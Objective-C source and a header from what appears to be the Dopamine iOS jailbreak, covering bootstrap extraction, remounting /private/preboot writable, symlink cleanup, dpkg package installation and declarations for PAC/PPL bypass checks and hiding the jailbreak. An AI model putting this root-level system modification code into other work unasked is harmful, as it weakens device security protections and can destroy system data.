//  Bootstrapper.m
//  Dopamine
//
//  Created by Lars Fröder on 09.01.24.
//

#import "DOBootstrapper.h"
#import "DOEnvironmentManager.h"
#import "DOUIManager.h"
#import <libjailbreak/info.h>
#import <libjailbreak/util.h>
#import <libjailbreak/jbclient_xpc.h>
#import "zstd.h"
#import <sys/mount.h>
#import <dlfcn.h>
#import <sys/stat.h>
#import "NSString+Version.h"

#define LIBKRW_DOPAMINE_BUNDLED_VERSION @"2.0.3"
#define LIBROOT_DOPAMINE_BUNDLED_VERSION @"1.0.1"
#define BASEBIN_LINK_BUNDLED_VERSION @"1.0.0"

static NSDictionary *gBundledPackages = @{
    @"libkrw0-dopamine" : LIBKRW_DOPAMINE_BUNDLED_VERSION,
    @"libroot-dopamine" : LIBROOT_DOPAMINE_BUNDLED_VERSION,
    @"dopamine-basebin-link" : BASEBIN_LINK_BUNDLED_VERSION,
};

struct hfs_mount_args {
    char    *fspec;
    uid_t    hfs_uid;        /* uid that owns hfs files (standard HFS only) */
    gid_t    hfs_gid;        /* gid that owns hfs files (standard HFS only) */
    mode_t    hfs_mask;        /* mask to be applied for hfs perms  (standard HFS only) */
    uint32_t hfs_encoding;        /* encoding for this volume (standard HFS only) */
    struct    timezone hfs_timezone;    /* user time zone info (standard HFS only) */
    int        flags;            /* mounting flags, see below */
    int     journal_tbuffer_size;   /* size in bytes of the journal transaction buffer */
    int        journal_flags;          /* flags to pass to journal_open/create */
    int        journal_disable;        /* don't use journaling (potentially dangerous) */
};

NSString *const bootstrapErrorDomain = @"BootstrapErrorDomain";
typedef NS_ENUM(NSInteger, JBErrorCode) {
    BootstrapErrorCodeFailedToGetURL            = -1,
    BootstrapErrorCodeFailedToDownload          = -2,
    BootstrapErrorCodeFailedDecompressing       = -3,
    BootstrapErrorCodeFailedExtracting          = -4,
    BootstrapErrorCodeFailedRemount             = -5,
    BootstrapErrorCodeFailedFinalising          = -6,
    BootstrapErrorCodeFailedReplacing           = -7,
};

#define BUFFER_SIZE 8192

@implementation DOBootstrapper

- (instancetype)init
{
    self = [super init];
    if (self) {
        /*NSURLSessionConfiguration *config = [NSURLSessionConfiguration backgroundSessionConfigurationWithIdentifier:@"com.opa334.bootstrapper.background-session"];
        _urlSession = [NSURLSession sessionWithConfiguration:config delegate:self delegateQueue:nil];*/
    }
    return self;
}

- (NSError *)decompressZstd:(NSString *)zstdPath toTar:(NSString *)tarPath
{
    // Open the input file for reading
    FILE *input_file = fopen(zstdPath.fileSystemRepresentation, "rb");
    if (input_file == NULL) {
        return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedDecompressing userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to open input file %@: %s", zstdPath, strerror(errno)]}];
    }

    // Open the output file for writing
    FILE *output_file = fopen(tarPath.fileSystemRepresentation, "wb");
    if (output_file == NULL) {
        fclose(input_file);
        return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedDecompressing userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to open output file %@: %s", tarPath, strerror(errno)]}];
    }

    // Create a ZSTD decompression context
    ZSTD_DCtx *dctx = ZSTD_createDCtx();
    if (dctx == NULL) {
        fclose(input_file);
        fclose(output_file);
        return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedDecompressing userInfo:@{NSLocalizedDescriptionKey : @"Failed to create ZSTD decompression context"}];
    }

    // Create a buffer for reading input data
    uint8_t *input_buffer = (uint8_t *) malloc(BUFFER_SIZE);
    if (input_buffer == NULL) {
        ZSTD_freeDCtx(dctx);
        fclose(input_file);
        fclose(output_file);
        return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedDecompressing userInfo:@{NSLocalizedDescriptionKey : @"Failed to allocate input buffer"}];
    }

    // Create a buffer for writing output data
    uint8_t *output_buffer = (uint8_t *) malloc(BUFFER_SIZE);
    if (output_buffer == NULL) {
        free(input_buffer);
        ZSTD_freeDCtx(dctx);
        fclose(input_file);
        fclose(output_file);
        return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedDecompressing userInfo:@{NSLocalizedDescriptionKey : @"Failed to allocate output buffer"}];
    }

    // Create a ZSTD decompression stream
    ZSTD_inBuffer in = {0};
    ZSTD_outBuffer out = {0};
    ZSTD_DStream *dstream = ZSTD_createDStream();
    if (dstream == NULL) {
        free(output_buffer);
        free(input_buffer);
        ZSTD_freeDCtx(dctx);
        fclose(input_file);
        fclose(output_file);
        return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedDecompressing userInfo:@{NSLocalizedDescriptionKey : @"Failed to create ZSTD decompression stream"}];
    }

    // Initialize the ZSTD decompression stream
    size_t ret = ZSTD_initDStream(dstream);
    if (ZSTD_isError(ret)) {
        ZSTD_freeDStream(dstream);
        free(output_buffer);
        free(input_buffer);
        ZSTD_freeDCtx(dctx);
        fclose(input_file);
        fclose(output_file);
        return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedDecompressing userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to initialize ZSTD decompression stream: %s", ZSTD_getErrorName(ret)]}];
    }
    
    // Read and decompress the input file
    size_t total_bytes_read = 0;
    size_t total_bytes_written = 0;
    size_t bytes_read;
    size_t bytes_written;
    while (1) {
        // Read input data into the input buffer
        bytes_read = fread(input_buffer, 1, BUFFER_SIZE, input_file);
        if (bytes_read == 0) {
            if (feof(input_file)) {
                // End of input file reached, break out of loop
                break;
            } else {
                ZSTD_freeDStream(dstream);
                free(output_buffer);
                free(input_buffer);
                ZSTD_freeDCtx(dctx);
                fclose(input_file);
                fclose(output_file);
                return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedDecompressing userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to read input file: %s", strerror(errno)]}];
            }
        }

        in.src = input_buffer;
        in.size = bytes_read;
        in.pos = 0;

        while (in.pos < in.size) {
            // Initialize the output buffer
            out.dst = output_buffer;
            out.size = BUFFER_SIZE;
            out.pos = 0;

            // Decompress the input data
            ret = ZSTD_decompressStream(dstream, &out, &in);
            if (ZSTD_isError(ret)) {
                ZSTD_freeDStream(dstream);
                free(output_buffer);
                free(input_buffer);
                ZSTD_freeDCtx(dctx);
                fclose(input_file);
                fclose(output_file);
                return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedDecompressing userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to decompress input data: %s", ZSTD_getErrorName(ret)]}];
            }

            // Write the decompressed data to the output file
            bytes_written = fwrite(output_buffer, 1, out.pos, output_file);
            if (bytes_written != out.pos) {
                ZSTD_freeDStream(dstream);
                free(output_buffer);
                free(input_buffer);
                ZSTD_freeDCtx(dctx);
                fclose(input_file);
                fclose(output_file);
                return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedDecompressing userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to write output file: %s", strerror(errno)]}];
            }

            total_bytes_written += bytes_written;
        }

        total_bytes_read += bytes_read;
    }

    // Clean up resources
    ZSTD_freeDStream(dstream);
    free(output_buffer);
    free(input_buffer);
    ZSTD_freeDCtx(dctx);
    fclose(input_file);
    fclose(output_file);

    return nil;
}

- (NSError *)extractTar:(NSString *)tarPath toPath:(NSString *)destinationPath
{
    int r = libarchive_unarchive(tarPath.fileSystemRepresentation, destinationPath.fileSystemRepresentation);
    if (r != 0) {
        return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedExtracting userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"libarchive returned %d", r]}];
    }
    return nil;
}

- (BOOL)deleteSymlinkAtPath:(NSString *)path error:(NSError **)error
{
    NSDictionary<NSFileAttributeKey, id> *attributes = [[NSFileManager defaultManager] attributesOfItemAtPath:path error:error];
    if (!attributes) return YES;
    if (attributes[NSFileType] == NSFileTypeSymbolicLink) {
        return [[NSFileManager defaultManager] removeItemAtPath:path error:error];
    }
    return NO;
}

- (BOOL)fileOrSymlinkExistsAtPath:(NSString *)path
{
    if ([[NSFileManager defaultManager] fileExistsAtPath:path]) return YES;
    
    NSDictionary<NSFileAttributeKey, id> *attributes = [[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil];
    if (attributes) {
        if (attributes[NSFileType] == NSFileTypeSymbolicLink) {
            return YES;
        }
    }
    
    return NO;
}

- (NSError *)createSymlinkAtPath:(NSString *)path toPath:(NSString *)destinationPath createIntermediateDirectories:(BOOL)createIntermediate
{
    NSError *error;
    NSString *parentPath = [path stringByDeletingLastPathComponent];
    if (![[NSFileManager defaultManager] fileExistsAtPath:parentPath]) {
        if (!createIntermediate) return [NSError errorWithDomain:bootstrapErrorDomain code:-1 userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed create %@->%@ symlink: Parent dir does not exists", path, destinationPath]}];
        if (![[NSFileManager defaultManager] createDirectoryAtPath:parentPath withIntermediateDirectories:YES attributes:nil error:&error]) return error;
    }
    
    [[NSFileManager defaultManager] createSymbolicLinkAtPath:path withDestinationPath:destinationPath error:&error];
    return error;
}

- (BOOL)isPrivatePrebootMountedWritable
{
    struct statfs ppStfs;
    statfs("/private/preboot", &ppStfs);
    return !(ppStfs.f_flags & MNT_RDONLY);
}

- (int)remountPrivatePrebootWritable:(BOOL)writable
{
    struct statfs ppStfs;
    int r = statfs("/private/preboot", &ppStfs);
    if (r != 0) return r;
    
    uint32_t flags = MNT_UPDATE;
    if (!writable) {
        flags |= MNT_RDONLY;
    }
    struct hfs_mount_args mntargs =
    {
        .fspec = ppStfs.f_mntfromname,
        .hfs_mask = 0,
    };
    return mount("apfs", "/private/preboot", flags, &mntargs);
}

- (NSError *)ensurePrivatePrebootIsWritable
{
    if (![self isPrivatePrebootMountedWritable]) {
        int r = [self remountPrivatePrebootWritable:YES];
        if (r != 0) {
            return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedRemount userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Remounting /private/preboot as writable failed with error: %s", strerror(errno)]}];
        }
    }
    return nil;
}

- (void)fixupPathPermissions
{
    // Ensure the following paths are owned by root:wheel and have permissions of 755:
    // /private
    // /private/preboot
    // /private/preboot/UUID
    // /private/preboot/UUID/dopamine-<UUID>
    // /private/preboot/UUID/dopamine-<UUID>/procursus

    NSString *tmpPath = JBROOT_PATH(@"/");
    while (![tmpPath isEqualToString:@"/"]) {
        struct stat s;
        stat(tmpPath.fileSystemRepresentation, &s);
        if (s.st_uid != 0 || s.st_gid != 0) {
            chown(tmpPath.fileSystemRepresentation, 0, 0);
        }
        if ((s.st_mode & S_IRWXU) != 0755) {
            chmod(tmpPath.fileSystemRepresentation, 0755);
        }
        tmpPath = [tmpPath stringByDeletingLastPathComponent];
    }
}

- (void)patchBasebinDaemonPlist:(NSString *)plistPath
{
    NSMutableDictionary *plistDict = [NSMutableDictionary dictionaryWithContentsOfFile:plistPath];
    if (plistDict) {
        bool madeChanges = NO;
        NSMutableArray *programArguments = ((NSArray *)plistDict[@"ProgramArguments"]).mutableCopy;
        for (NSString *argument in [programArguments reverseObjectEnumerator]) {
            if ([argument containsString:@"@JBROOT@"]) {
                programArguments[[programArguments indexOfObject:argument]] = [argument stringByReplacingOccurrencesOfString:@"@JBROOT@" withString:JBROOT_PATH(@"/")];
                madeChanges = YES;
            }
        }
        if (madeChanges) {
            plistDict[@"ProgramArguments"] = programArguments.copy;
            [plistDict writeToFile:plistPath atomically:NO];
        }
    }
}

- (void)patchBasebinDaemonPlists
{
    NSURL *basebinDaemonsURL = [NSURL fileURLWithPath:JBROOT_PATH(@"/basebin/LaunchDaemons")];
    for (NSURL *basebinDaemonURL in [[NSFileManager defaultManager] contentsOfDirectoryAtURL:basebinDaemonsURL includingPropertiesForKeys:nil options:0 error:nil]) {
        [self patchBasebinDaemonPlist:basebinDaemonURL.path];
    }
}

- (NSString *)bootstrapVersion
{
    uint64_t cfver = (((uint64_t)kCFCoreFoundationVersionNumber / 100) * 100);
    if (cfver >= 2000) {
        return nil;
    }
    return [NSString stringWithFormat:@"%llu", cfver];
}

- (NSURL *)bootstrapURL
{
    return [NSURL URLWithString:[NSString stringWithFormat:@"https://apt.procurs.us/bootstraps/%@/bootstrap-ssh-iphoneos-arm64.tar.zst", [self bootstrapVersion]]];
}

/*- (void)downloadBootstrapWithCompletion:(void (^)(NSString *path, NSError *error))completion
{
    NSURL *bootstrapURL = [self bootstrapURL];
    if (!bootstrapURL) {
        completion(nil, [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedToGetURL userInfo:@{NSLocalizedDescriptionKey : @"Failed to obtain bootstrap URL"}]);
        return;
    }
    
    _downloadCompletionBlock = ^(NSURL * _Nullable location, NSError * _Nullable error) {
        NSError *ourError;
        if (error) {
            ourError = [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedToDownload userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to download bootstrap: %@", error.localizedDescription]}];
        }
        completion(location.path, ourError);
    };
    
    _bootstrapDownloadTask = [_urlSession downloadTaskWithURL:bootstrapURL];
    [_bootstrapDownloadTask resume];
}*/

- (void)extractBootstrap:(NSString *)path withCompletion:(void (^)(NSError *))completion
{
    NSString *bootstrapTar = [@"/var/tmp" stringByAppendingPathComponent:@"bootstrap.tar"];
    NSError *decompressionError = [self decompressZstd:path toTar:bootstrapTar];
    if (decompressionError) {
        completion(decompressionError);
        return;
    }
    
    decompressionError = [self extractTar:bootstrapTar toPath:@"/"];
    if (decompressionError) {
        completion(decompressionError);
        return;
    }
    
    [[NSData data] writeToFile:JBROOT_PATH(@"/.installed_dopamine") atomically:YES];
    completion(nil);
}

- (void)prepareBootstrapWithCompletion:(void (^)(NSError *))completion
{
    [[DOUIManager sharedInstance] sendLog:@"Updating BaseBin" debug:NO];

    // Ensure /private/preboot is mounted writable (Not writable by default on iOS <=15)
    NSError *error = [self ensurePrivatePrebootIsWritable];
    if (error) {
        completion(error);
        return;
    }
    
    [self fixupPathPermissions];
    
    // Remove /var/jb as it might be wrong
    if (![self deleteSymlinkAtPath:@"/var/jb" error:&error]) {
        if ([[NSFileManager defaultManager] fileExistsAtPath:@"/var/jb"]) {
            if (![[NSFileManager defaultManager] removeItemAtPath:@"/var/jb" error:&error]) {
                completion([NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedReplacing userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Removing /var/jb directory failed with error: %@", error]}]);
                return;
            }
        }
        else {
            completion([NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedReplacing userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Removing /var/jb symlink failed with error: %@", error]}]);
            return;
        }
    }
    
    // Clean up xinaA15 v1 leftovers if desired
    if (![[NSFileManager defaultManager] fileExistsAtPath:@"/var/.keep_symlinks"]) {
        NSArray *xinaLeftoverSymlinks = @[
            @"/var/alternatives",
            @"/var/ap",
            @"/var/apt",
            @"/var/bin",
            @"/var/bzip2",
            @"/var/cache",
            @"/var/dpkg",
            @"/var/etc",
            @"/var/gzip",
            @"/var/lib",
            @"/var/Lib",
            @"/var/libexec",
            @"/var/Library",
            @"/var/LIY",
            @"/var/Liy",
            @"/var/local",
            @"/var/newuser",
            @"/var/profile",
            @"/var/sbin",
            @"/var/suid_profile",
            @"/var/sh",
            @"/var/sy",
            @"/var/share",
            @"/var/ssh",
            @"/var/sudo_logsrvd.conf",
            @"/var/suid_profile",
            @"/var/sy",
            @"/var/usr",
            @"/var/zlogin",
            @"/var/zlogout",
            @"/var/zprofile",
            @"/var/zshenv",
            @"/var/zshrc",
            @"/var/log/dpkg",
            @"/var/log/apt",
        ];
        NSArray *xinaLeftoverFiles = @[
            @"/var/lib",
            @"/var/master.passwd"
        ];
        
        for (NSString *xinaLeftoverSymlink in xinaLeftoverSymlinks) {
            [self deleteSymlinkAtPath:xinaLeftoverSymlink error:nil];
        }
        
        for (NSString *xinaLeftoverFile in xinaLeftoverFiles) {
            if ([[NSFileManager defaultManager] fileExistsAtPath:xinaLeftoverFile]) {
                [[NSFileManager defaultManager] removeItemAtPath:xinaLeftoverFile error:nil];
            }
        }
    }
    
    NSString *basebinPath = JBROOT_PATH(@"/basebin");
    NSString *installedPath = JBROOT_PATH(@"/.installed_dopamine");
    error = [self createSymlinkAtPath:@"/var/jb" toPath:JBROOT_PATH(@"/") createIntermediateDirectories:YES];
    if (error) {
        completion(error);
        return;
    }
    
    if ([[NSFileManager defaultManager] fileExistsAtPath:basebinPath]) {
        if (![[NSFileManager defaultManager] removeItemAtPath:basebinPath error:&error]) {
            completion([NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedExtracting userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed deleting existing basebin file with error: %@", error.localizedDescription]}]);
            return;
        }
    }
    error = [self extractTar:[[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"basebin.tar"] toPath:JBROOT_PATH(@"/")];
    if (error) {
        completion(error);
        return;
    }
    [self patchBasebinDaemonPlists];
    [[NSFileManager defaultManager] removeItemAtPath:JBROOT_PATH(@"/basebin/basebin.tc") error:nil];
    
    void (^bootstrapFinishedCompletion)(NSError *) = ^(NSError *error){
        if (error) {
            completion(error);
            return;
        }
        
        NSString *defaultSources = @"Types: deb\n"
            @"URIs: https://repo.chariz.com/\n"
            @"Suites: ./\n"
            @"Components:\n"
            @"\n"
            @"Types: deb\n"
            @"URIs: https://havoc.app/\n"
            @"Suites: ./\n"
            @"Components:\n"
            @"\n"
            @"Types: deb\n"
            @"URIs: http://apt.thebigboss.org/repofiles/cydia/\n"
            @"Suites: stable\n"
            @"Components: main\n"
            @"\n"
            @"Types: deb\n"
            @"URIs: https://ellekit.space/\n"
            @"Suites: ./\n"
            @"Components:\n";
        [defaultSources writeToFile:JBROOT_PATH(@"/etc/apt/sources.list.d/default.sources") atomically:NO encoding:NSUTF8StringEncoding error:nil];
        
        NSString *mobilePreferencesPath = JBROOT_PATH(@"/var/mobile/Library/Preferences");
        if (![[NSFileManager defaultManager] fileExistsAtPath:mobilePreferencesPath]) {
            NSDictionary<NSFileAttributeKey, id> *attributes = @{
                NSFilePosixPermissions : @0755,
                NSFileOwnerAccountID : @501,
                NSFileGroupOwnerAccountID : @501,
            };
            [[NSFileManager defaultManager] createDirectoryAtPath:mobilePreferencesPath withIntermediateDirectories:YES attributes:attributes error:nil];
        }
        
        JBFixMobilePermissions();

        completion(nil);
    };
    
    
    BOOL needsBootstrap = ![[NSFileManager defaultManager] fileExistsAtPath:installedPath];
    if (needsBootstrap) {
        // First, wipe any existing content that's not basebin
        for (NSURL *subItemURL in [[NSFileManager defaultManager] contentsOfDirectoryAtURL:[NSURL fileURLWithPath:JBROOT_PATH(@"/")] includingPropertiesForKeys:nil options:0 error:nil]) {
            if (![subItemURL.lastPathComponent isEqualToString:@"basebin"]) {
                [[NSFileManager defaultManager] removeItemAtURL:subItemURL error:nil];
            }
        }
        
        /*void (^bootstrapDownloadCompletion)(NSString *, NSError *) = ^(NSString *path, NSError *error) {
            if (error) {
                completion(error);
                return;
            }
            [self extractBootstrap:path withCompletion:bootstrapFinishedCompletion];
        };*/
        
        [[DOUIManager sharedInstance] sendLog:@"Extracting Bootstrap" debug:NO];

        NSString *bootstrapZstdPath = [NSString stringWithFormat:@"%@/bootstrap_%@.tar.zst", [NSBundle mainBundle].bundlePath, [self bootstrapVersion]];
        [self extractBootstrap:bootstrapZstdPath withCompletion:bootstrapFinishedCompletion];

        /*NSString *documentsCandidate = @"/var/mobile/Documents/bootstrap.tar.zstd";
        NSString *bundleCandidate = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"bootstrap.tar.zstd"];
        // Check if the user provided a bootstrap
        if ([[NSFileManager defaultManager] fileExistsAtPath:documentsCandidate]) {
            bootstrapDownloadCompletion(documentsCandidate, nil);
        }
        else if ([[NSFileManager defaultManager] fileExistsAtPath:bundleCandidate]) {
            bootstrapDownloadCompletion(bundleCandidate, nil);
        }
        else {
            [[DOUIManager sharedInstance] sendLog:@"Downloading Bootstrap" debug:NO];
            [self downloadBootstrapWithCompletion:bootstrapDownloadCompletion];
        }*/
    }
    else {
        bootstrapFinishedCompletion(nil);
    }
}

- (int)installPackage:(NSString *)packagePath
{
    if (getuid() == 0) {
        return exec_cmd_trusted(JBROOT_PATH("/usr/bin/dpkg"), "-i", packagePath.fileSystemRepresentation, NULL);
    }
    else {
        // idk why but waitpid sometimes fails and this returns -1, so we just ignore the return value
        exec_cmd(JBROOT_PATH("/basebin/jbctl"), "internal", "install_pkg", packagePath.fileSystemRepresentation, NULL);
        return 0;
    }
}

- (int)uninstallPackageWithIdentifier:(NSString *)identifier
{
    return exec_cmd_trusted(JBROOT_PATH("/usr/bin/dpkg"), "-r", identifier.UTF8String, NULL);
}

- (NSString *)installedVersionForPackageWithIdentifier:(NSString *)identifier
{
    NSString *dpkgStatus = [NSString stringWithContentsOfFile:JBROOT_PATH(@"/var/lib/dpkg/status") encoding:NSUTF8StringEncoding error:nil];
    NSString *packageStartLine = [NSString stringWithFormat:@"Package: %@", identifier];
    
    NSArray *packageInfos = [dpkgStatus componentsSeparatedByString:@"\n\n"];
    for (NSString *packageInfo in packageInfos) {
        if ([packageInfo hasPrefix:packageStartLine]) {
            __block NSString *version = nil;
            [packageInfo enumerateLinesUsingBlock:^(NSString * _Nonnull line, BOOL * _Nonnull stop) {
                if ([line hasPrefix:@"Version: "]) {
                    version = [line substringFromIndex:9];
                }
            }];
            return version;
        }
    }
    return nil;
}

- (NSError *)installPackageManagers
{
    NSArray *enabledPackageManagers = [[DOUIManager sharedInstance] enabledPackageManagers];
    for (NSDictionary *packageManagerDict in enabledPackageManagers) {
        NSString *path = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:packageManagerDict[@"Package"]];
        NSString *name = packageManagerDict[@"Display Name"];
        int r = [self installPackage:path];
        if (r != 0) {
            return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedFinalising userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to install %@: %d\n", name, r]}];
        }
    }
    return nil;
}

- (BOOL)shouldInstallPackage:(NSString *)identifier
{
    NSString *bundledVersion = gBundledPackages[identifier];
    if (!bundledVersion) return NO;
    
    NSString *installedVersion = [self installedVersionForPackageWithIdentifier:identifier];
    if (!installedVersion) return YES;
    
    return [installedVersion numericalVersionRepresentation] < [bundledVersion numericalVersionRepresentation];
}

- (NSError *)finalizeBootstrap
{
    // Initial setup on first jailbreak
    if ([[NSFileManager defaultManager] fileExistsAtPath:JBROOT_PATH(@"/prep_bootstrap.sh")]) {
        [[DOUIManager sharedInstance] sendLog:@"Finalizing Bootstrap" debug:NO];
        int r = exec_cmd_trusted(JBROOT_PATH("/bin/sh"), JBROOT_PATH("/prep_bootstrap.sh"), NULL);
        if (r != 0) {
            return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedFinalising userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"prep_bootstrap.sh returned %d\n", r]}];
        }
        
        NSError *error = [self installPackageManagers];
        if (error) return error;
    }
    
    BOOL shouldInstallLibroot = [self shouldInstallPackage:@"libroot-dopamine"];
    BOOL shouldInstallLibkrw = [self shouldInstallPackage:@"libkrw0-dopamine"];
    BOOL shouldInstallBasebinLink = [self shouldInstallPackage:@"dopamine-basebin-link"];
    
    if (shouldInstallLibroot || shouldInstallLibkrw || shouldInstallBasebinLink) {
        [[DOUIManager sharedInstance] sendLog:@"Updating Bundled Packages" debug:NO];
        if (shouldInstallLibroot) {
            NSString *librootPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"libroot.deb"];
            int r = [self installPackage:librootPath];
            if (r != 0) return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedFinalising userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to install libroot: %d\n", r]}];
        }
        
        if (shouldInstallLibkrw) {
            NSString *libkrwPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"libkrw-dopamine.deb"];
            int r = [self installPackage:libkrwPath];
            if (r != 0) return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedFinalising userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to install the libkrw plugin: %d\n", r]}];
        }
        
        if (shouldInstallBasebinLink) {
            // Clean symlinks from earlier Dopamine versions
            if ([self fileOrSymlinkExistsAtPath:JBROOT_PATH(@"/usr/bin/opainject")]) {
                [[NSFileManager defaultManager] removeItemAtPath:JBROOT_PATH(@"/usr/bin/opainject") error:nil];
            }
            if ([self fileOrSymlinkExistsAtPath:JBROOT_PATH(@"/usr/bin/jbctl")]) {
                [[NSFileManager defaultManager] removeItemAtPath:JBROOT_PATH(@"/usr/bin/jbctl") error:nil];
            }
            if ([self fileOrSymlinkExistsAtPath:JBROOT_PATH(@"/usr/lib/libjailbreak.dylib")]) {
                [[NSFileManager defaultManager] removeItemAtPath:JBROOT_PATH(@"/usr/lib/libjailbreak.dylib") error:nil];
            }
            if ([self fileOrSymlinkExistsAtPath:JBROOT_PATH(@"/usr/bin/libjailbreak.dylib")]) {
                // Yes this exists >.< was a typo
                [[NSFileManager defaultManager] removeItemAtPath:JBROOT_PATH(@"/usr/bin/libjailbreak.dylib") error:nil];
            }
            
            NSString *basebinLinkPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:@"basebin-link.deb"];
            int r = [self installPackage:basebinLinkPath];
            if (r != 0) return [NSError errorWithDomain:bootstrapErrorDomain code:BootstrapErrorCodeFailedFinalising userInfo:@{NSLocalizedDescriptionKey : [NSString stringWithFormat:@"Failed to install basebin link: %d\n", r]}];
        }
    }

    return nil;
}

- (NSError *)deleteBootstrap
{
    NSError *error = [self ensurePrivatePrebootIsWritable];
    if (error) return error;
    NSString *path = [[NSString stringWithUTF8String:gSystemInfo.jailbreakInfo.rootPath] stringByDeletingLastPathComponent];
    [[NSFileManager defaultManager] removeItemAtPath:path error:&error];
    if (error) return error;
    [[NSFileManager defaultManager] removeItemAtPath:@"/var/jb" error:nil];
    return error;
}

- (void)URLSession:(NSURLSession *)session downloadTask:(NSURLSessionDownloadTask *)downloadTask didWriteData:(int64_t)bytesWritten totalBytesWritten:(int64_t)totalBytesWritten totalBytesExpectedToWrite:(int64_t)totalBytesExpectedToWrite
{
    if (downloadTask == _bootstrapDownloadTask) {
        NSString *sizeString = [NSByteCountFormatter stringFromByteCount:totalBytesWritten countStyle:NSByteCountFormatterCountStyleFile];
        NSString *writtenBytesString = [NSByteCountFormatter stringFromByteCount:totalBytesExpectedToWrite countStyle:NSByteCountFormatterCountStyleFile];
        
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Downloading Bootstrap (%@/%@)", sizeString, writtenBytesString] debug:NO update:YES];
    }
}

- (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error
{
    _downloadCompletionBlock(nil, error);
}

- (void)URLSession:(nonnull NSURLSession *)session downloadTask:(nonnull NSURLSessionDownloadTask *)downloadTask didFinishDownloadingToURL:(nonnull NSURL *)location
{
    _downloadCompletionBlock(location, nil);
}

@end

```

`Application/Dopamine/Jailbreak/DOEnvironmentManager.h`:

```h
//
//  EnvironmentManager.h
//  Dopamine
//
//  Created by Lars Fröder on 10.01.24.
//

#import <Foundation/Foundation.h>
#import "DOBootstrapper.h"

NS_ASSUME_NONNULL_BEGIN

@interface DOEnvironmentManager : NSObject
{
    DOBootstrapper *_bootstrapper;
    BOOL _bootstrapNeedsMigration;
}

+ (instancetype)sharedManager;

@property (nonatomic, readonly) NSData *bootManifestHash;

- (NSString *)appVersion;
- (NSString *)appVersionDisplayString;
- (NSString *)nightlyHash;

- (BOOL)isInstalledThroughTrollStore;
- (BOOL)isJailbroken;
- (BOOL)isBootstrapped;
- (NSString *)jailbrokenVersion;

- (BOOL)isSupported;
- (BOOL)isArm64e;
- (NSString *)versionSupportString;
- (NSString *)accessibleKernelPath;
- (void)locateJailbreakRoot;
- (NSError *)ensureJailbreakRootExists;


- (void)runUnsandboxed:(void (^)(void))unsandboxBlock;
- (void)runAsRoot:(void (^)(void))rootBlock;

- (void)respring;
- (void)rebootUserspace;
- (void)refreshJailbreakApps;
- (void)reboot;
- (void)changeMobilePassword:(NSString *)newPassword;
- (NSError*)updateEnvironment;
- (void)updateJailbreakFromTIPA:(NSString *)tipaPath;

- (BOOL)isTweakInjectionEnabled;
- (void)setTweakInjectionEnabled:(BOOL)enabled;
- (BOOL)isIDownloadEnabled;
- (void)setIDownloadEnabled:(BOOL)enabled needsUnsandbox:(BOOL)needsUnsandbox;
- (void)setIDownloadLoaded:(BOOL)loaded needsUnsandbox:(BOOL)needsUnsandbox;
- (BOOL)isFakelibMounted;
- (int)setFakelibMounted:(BOOL)mounted;
- (int)setPrivatePrebootProtected:(BOOL)protected;
- (BOOL)isJailbreakHidden;
- (void)setJailbreakHidden:(BOOL)hidden;

- (BOOL)isPACBypassRequired;
- (BOOL)isPPLBypassRequired;

- (NSError *)prepareBootstrap;
- (NSError *)finalizeBootstrap;
- (NSError *)deleteBootstrap;
- (NSError *)reinstallPackageManagers;
- (NSError *)updateBootLogo;
@end

NS_ASSUME_NONNULL_END

```

